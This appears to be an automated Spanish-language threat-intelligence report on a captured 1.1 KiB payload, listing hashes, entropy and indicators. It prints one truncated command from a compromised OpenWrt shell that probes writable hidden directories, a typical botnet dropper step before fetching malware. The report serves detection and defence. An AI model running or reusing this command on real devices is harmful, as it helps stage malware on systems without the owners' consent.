# 🧬 Payload Analysis

`e27a6a1b5603a37a453e5623a5a23b4981e6430b0dc1feb3fb22de40e92d89ab`

## 📌 Resumen

Artefacto de 1.1 KiB. Entropía registrada: 5.32. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Se identificó 1 comando observado o extraído. Se identificaron 2 indicadores técnicos.


## 🗓️ Registro

- **Registrado:** `2026-08-09T19:27:32.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `e27a6a1b5603a37a453e5623a5a23b4981e6430b0dc1feb3fb22de40e92d89ab`
- **MD5:** `f6727c6029c10db8711ac0dbab5b34f8`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 1.1 KiB |
| Entropía | 5.32 |
| Strings | 25 |

## 🖥️ Comandos observados / extraídos

```text
[4ladmin@OpenWrt:~$ >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /de
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| command | [4ladmin@OpenWrt:~$ >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /de | strings |
| hash | e27a6a1b5603a37a453e5623a5a23b4981e6430b0dc1feb3fb22de40e92d89ab | static_analysis |
| ip | [internal-ip-redacted] | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
